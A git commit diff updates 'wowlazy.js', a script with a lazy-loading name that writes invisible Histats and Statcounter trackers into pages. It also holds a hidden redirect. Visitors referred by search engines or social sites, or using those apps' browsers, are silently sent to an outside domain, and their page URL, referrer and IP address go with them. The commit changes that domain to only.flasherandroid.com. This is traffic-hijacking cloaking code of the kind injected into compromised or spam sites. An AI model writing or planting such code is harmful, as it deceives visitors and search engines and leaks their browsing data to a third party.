4b7d2f6631c559c780470739cd870e3e08ef5997
DayB4r <nitans404@gmail.com>
2025-04-10 22:56:24 +0700

    Update wowlazy.js

--- arsa/wowlazy.js
+++ arsa/wowlazy.js
@@ -1,21 +1,21 @@
 ///// Histats /////
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943112&101"width="0" height="0"/>');
 
 ///// Statcounter /////
 
-var sc_project=12978198; 
+var sc_project=13117468; 
 var sc_invisible=1; 
-var sc_security="9f31a33b"; 
+var sc_security="fde196db"; 
 
 document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
 document.write('<noscript>');
 document.write('<div class="statcounter">');
 document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
-document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
+document.write('<img class="statcounter" src="https://c.statcounter.com/13117468/0/fde196db/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
 document.write('</a>');
 document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'https://stocks.wowlazy.com';
+var ars = 'https://only.flasherandroid.com';
 if(['.edu.', '.google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + "&ip=" + window.ipAddressArsae }
